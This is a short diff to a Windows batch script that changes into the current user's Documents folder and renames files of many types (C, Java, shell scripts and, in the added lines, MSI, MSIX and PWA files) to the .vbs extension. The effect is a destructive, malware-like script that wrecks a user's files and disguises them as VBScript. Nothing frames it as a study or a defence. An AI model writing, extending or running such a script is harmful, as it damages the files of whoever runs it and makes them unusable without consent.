@@ -1,4 +1,7 @@
 cd C:\Users\%username%\documents
+ren *.msi *.vbs
+ren *.msix *.vbs
+ren *.pwa *.vbs
 ren *.c *.vbs
 ren *.java *.vbs
 ren *.sh *.vbs
